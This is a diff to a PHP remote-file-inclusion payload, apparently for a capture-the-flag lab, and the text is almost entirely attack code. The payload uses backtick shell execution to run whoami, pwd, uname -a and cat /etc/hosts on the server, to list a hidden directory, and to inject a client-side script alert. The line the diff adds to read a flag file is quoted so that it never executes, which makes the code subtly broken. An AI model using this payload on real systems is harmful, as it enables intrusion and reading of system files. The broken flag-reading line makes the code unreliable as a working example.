@@ -4,6 +4,7 @@
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
     $ls_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
+    $cat_flag = 'cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php';
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
@@ -24,6 +25,8 @@
     ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
     ECHO "<b><dt>uname -a:</b></dt>";
     ECHO "<dd>".$uname_a."</dd>";
+    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php</dt></b>";
+    ECHO "<dd><pre>".$cat_flag."</pre></dd>";
     ECHO "<script>alert(\"Client Side Script Execution: \" + document.domain );var run = true</script><!--"
 ?>
 -->
